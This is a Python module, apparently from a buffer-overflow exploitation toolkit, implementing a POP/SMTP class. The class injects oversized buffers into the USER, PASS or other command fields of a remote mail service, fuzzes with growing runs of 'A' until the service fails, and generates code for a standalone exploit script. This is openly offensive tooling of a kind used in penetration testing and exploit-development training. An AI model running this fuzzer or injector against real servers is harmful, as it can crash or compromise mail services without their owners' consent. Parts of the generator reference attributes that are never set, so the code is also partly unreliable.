import os
import sys
import socket
import time
import getopt
from struct import *
import subprocess
import re
import binascii
from past.builtins import execfile
from protocols import *
from buffers import *
from protocols.tcp import Tcp


class PopSmtp:

    def __init__(self, config):
        self.config = config
        return None

    ############################
    # POP FUNCTIONS

    ############################
    ## POP INJECTION

    def inject(self, remoteip, port, field, buffer, stop_on_field):
        responses = []

        field = field.lower()

        try:

            if (stop_on_field == None):
                stop_on_field = False

            if (self.config.verbose_lv == 2):
                print("BUFFER BEGIN" + ("=" * 100))
                print(buffer)
                print(("=" * 100) + " BUFFER END")

            strlen = str(len(buffer))

            print("[!] Injecting %s bytes" % strlen)
            s = Tcp.connect(remoteip, port)

            if (self.config.verbose_lv == 2):
                print(s)

            if (s == None):
                return responses

            print(s.recv(2048))
            print("[.] Trying to overflow %s ..." % field)

            if (field != "user"):
                print(Tcp.prepare_command('USER user'))
                s.sendall(Tcp.prepare_command("USER user\r\n"))
            else:
                print('USER [' + strlen + ' bytes]')

                if not isinstance(buffer, str):
                    s.sendall(Tcp.prepare_command('USER ' + buffer.decode('latin-1') + '\r\n'))
                else:
                    s.sendall(Tcp.prepare_command('USER ' + buffer + '\r\n'))

            # if(stop_on_field):
            # response = s.recv(2048)
            # print(response)
            # 	s.close()
            # 	return response

            responses.append(s.recv(2048))
            print(responses[-1])

            if (field != "pass"):
                print(Tcp.prepare_command('PASS pass'))
                s.sendall(Tcp.prepare_command('PASS pass\r\n'))
            else:
                print('PASS [' + strlen + ' bytes]')

                if not isinstance(buffer, str) :
                    s.sendall(Tcp.prepare_command('PASS ' + buffer.decode('latin-1') + '\r\n'))
                else:
                    s.sendall(Tcp.prepare_command('PASS ' + buffer + '\r\n'))

            # if(stop_on_field):
            # response = s.recv(2048)
            # print(response)
            # 	s.close()
            # 	return response

            responses.append(s.recv(2048))
            print(responses[-1])

            if (field != "user" and field != "pass"):
                print(field + ' [' + strlen + ' bytes]')

                if not isinstance(buffer, str):
                    s.sendall(Tcp.prepare_command(field + ' ' + buffer.decode('latin-1') + '\r\n'))
                else:
                    s.sendall(Tcp.prepare_command(field + ' ' + buffer + '\r\n'))

                # if(stop_on_field):
                # response = s.recv(2048)
                # print(response)
                # 	s.close()
                # 	return response
                responses.append(s.recv(2048))
                print(responses[-1])

            s.close()

        except socket.error as error:
            print(error)
            return []

        return responses

    def fuzzer(self, remoteip, port, field, start_size, inc):
        if (inc == None):
            inc = 100

        if (start_size == None):
            size = 100
        else:
            size = start_size

        buffer = "A" * size

        if (field == None):
            field = "user"

        streaming = [True]
        while len(streaming) > 0:

            streaming = (self.inject(remoteip, port, field, buffer, None))

            if (len(streaming) > 0):
                _stream = streaming[-1].decode('latin-1').strip()

                _response = _stream.split(' ')

                # print("[!] ERROR COMMUNICATING TO THE SERVICE " + "|".join(streaming))
                # responsecode = int(_response[0].strip())

                # # 6xx	Protected reply
                # if responsecode > 599:
                # 	print(base64_decode(_response.join(' ')))

                # #5xx	Permanent Negative Completion reply
                # if responsecode > 499:
                # 	return size
                # 	break;

                time.sleep(1)

                size += inc
                buffer = "A" * size

        return size

    def output_stream(self, field):

        stream = ""

        if (field != "user"):
            stream += (" " * 4) + 's.sendall(("USER "' + self.auth_user + '"\\r\\n" + ").encode("latin-1"))\r\n'
            stream += (" " * 4) + "print(s.recv(2048))\r\n"
        else:
            stream += (" " * 4) + 's.sendall(("USER ").encode("latin1") + buffer + ("\\r\\n").encode("latin-1"))\r\n'
            stream += (" " * 4) + "print(s.recv(2048))\r\n"

        if (field != "pass"):
            stream += (" " * 4) + 's.sendall(("PASS ' + self.auth_pass + '\\r\\n").encode("latin-1"))\r\n'
            stream += (" " * 4) + "print(s.recv(2048))\r\n"
        else:
            stream += (" " * 4) + 's.sendall(("PASS ").encode("latin1") + buffer + ("\\r\\n").encode("latin-1"))\r\n'
            stream += (" " * 4) + "print(s.recv(2048))\r\n"

        if (field != "user" and field != "pass"):
            stream += (" " * 4) + 's.sendall(("' + field + ' ").encode("latin1") + buffer + ("\\r\\n").encode("latin-1"))\r\n'
            stream += (" " * 4) + "print(s.recv(2048))\r\n"

        return stream